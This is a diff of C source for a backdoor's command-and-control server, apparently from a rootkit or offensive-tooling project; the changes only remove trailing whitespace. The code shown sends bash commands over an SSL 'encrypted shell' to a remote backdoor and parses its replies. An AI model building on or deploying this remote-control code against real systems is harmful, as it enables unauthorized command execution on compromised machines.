@@ -21,10 +21,10 @@
 /**
  * @brief Operates input in command shell mode.
  * Returns whether the connection should keep open (0) or not (otherwise)
- * 
- * @param buf 
- * @param ssl 
- * @return int 
+ *
+ * @param buf
+ * @param ssl
+ * @return int
  */
 int live_command_shell_mode(char* buf, SSL *ssl){
 	int is_global_command = manage_global_command(buf, ssl, NULL, NULL);
@@ -39,7 +39,7 @@ int live_command_shell_mode(char* buf, SSL *ssl){
 	strcpy(request, CC_PROT_BASH_COMMAND_REQUEST);
 	strcat(request, buf);
 	SSL_write(ssl, request, strlen(request));
-	
+
 	bytes = SSL_read(ssl, buf, BUFSIZ);
 	buf[bytes] = '\0';
 	//If valid message in protocol, we proceed to parse it
@@ -55,7 +55,7 @@ int live_command_shell_mode(char* buf, SSL *ssl){
 			}else{
 				printf("[" KRED "ERROR" RESET "]""Could not parse backdoor answer correctly, ignoring\n");
 			}
-			
+
 		} else {
 			ERR_print_errors_fp(stderr);
 		}
@@ -184,17 +184,17 @@ int server_run(int port) {
 				//Depending on the mode, we show different UI and commands
 				switch(client_mode){
 					case CLIENT_MODE_LIVE_COMMAND:
-						printf(">> client["""KYLW"encrypted shell"RESET"""]>: ");                                                                                                                                                              
+						printf(">> client["""KYLW"encrypted shell"RESET"""]>: ");
 						fgets(buf, BUFSIZ, stdin);
 						if ((strlen(buf)>0) && (buf[strlen(buf)-1] == '\n')){
-							buf[strlen(buf)-1] = '\0';   
+							buf[strlen(buf)-1] = '\0';
 						}
 						connection_terminate = live_command_shell_mode(buf, ssl);
 						break;
 					default:
 						printf("Invalid client mode, fatal error, halting\n");
 						exit(FAIL);
-				}                                                                                                                                                          
+				}
 			}
 		}
 		sd = SSL_get_fd(ssl); /* get socket connection */
